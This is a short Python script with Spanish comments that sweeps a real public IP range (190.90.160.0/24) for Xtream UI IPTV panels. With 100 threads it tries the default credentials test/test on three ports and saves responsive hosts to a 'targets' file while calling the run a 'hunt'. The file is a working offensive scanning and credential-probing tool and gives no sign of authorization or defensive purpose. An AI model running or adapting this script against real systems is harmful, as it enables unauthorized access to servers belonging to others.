import requests
from concurrent.futures import ThreadPoolExecutor
import os

# Usamos tu configuración guardada para evitar bloqueos
os.environ['OPENSSL_CONF'] = os.path.expanduser("~/UnibanProject/openssl_legacy.cnf")

def check_panel(i):
    ip = f"190.90.160.{i}"
    # Probamos el puerto 80 y 8000 que son los estándar de Xtream UI
    for puerto in ["80", "8000", "25461"]:
        url = f"http://{ip}:{puerto}/player_api.php?username=test&password=test"
        try:
            r = requests.get(url, timeout=1.5)
            # Si responde con JSON, ¡bingo!
            if "user_info" in r.text:
                print(f"\n[🔥] ¡PANEL ABIERTO ENCONTRADO!: {ip}:{puerto}")
                with open("objetivos_shodan.txt", "a") as f: 
                    f.write(f"{ip}:{puerto}\n")
        except:
            pass

print("[📡] Iniciando CACERÍA en rango 190.90.160.0/24 (Sector Latam)...")
with ThreadPoolExecutor(max_workers=100) as executor:
    executor.map(check_panel, range(1, 255))
print("\n[✅] Cacería finalizada. Revisa 'objetivos_shodan.txt'.")
